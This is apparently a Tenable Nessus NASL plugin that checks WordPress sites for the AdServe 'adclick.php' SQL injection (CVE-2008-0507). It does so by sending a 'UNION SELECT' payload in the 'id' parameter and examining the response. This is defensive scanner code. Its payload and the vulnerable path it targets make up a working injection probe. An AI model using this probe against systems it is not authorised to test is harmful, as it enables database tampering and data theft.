#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(30129);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/05/19 18:10:51 $");

  script_cve_id("CVE-2008-0507");
  script_bugtraq_id(27504);
  script_osvdb_id(40779);
  script_xref(name:"EDB-ID", value:"5013");

  script_name(english:"WordPress AdServe 'adclick.php' 'id' Parameter SQL Injection");
  script_summary(english:"Attempts to generate a SQL syntax error.");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host is running AdServe, a third-party ad banner plugin for
WordPress.

The version of AdServe installed on the remote host fails to sanitize
input to the 'id' parameter of the 'adclick.php' script before using
it in a database query. Regardless of PHP's 'magic_quotes_gpc'
setting, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
modification of data, or attacks against the underlying database.");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/adserve/other_notes/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 0.3 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/01/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/01/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/WordPress");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'AdServe';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('AdServe is the advertising server for WordPress');
  checks["/wp-content/plugins/wp-adserve/readme.txt"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to exploit the issue to control the redirect.
magic = rand();
exploit = "-1 UNION SELECT " + magic;

w = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/wp-content/plugins/wp-adserve/adclick.php?id=" +
    urlencode(str:exploit),
  exit_on_fail : TRUE
);

# There's a problem if...
headers = w[1];
res = strcat(w[0], w[1], '\r\n', w[2]);
if (
  # we either see an error involving our exploit or...
  " clicks=clicks+1 WHERE id=" + exploit >< res ||
  # we see a redirect to our magic.
  egrep(pattern:"^Location: +" + magic, string:headers)
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  security_hole(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
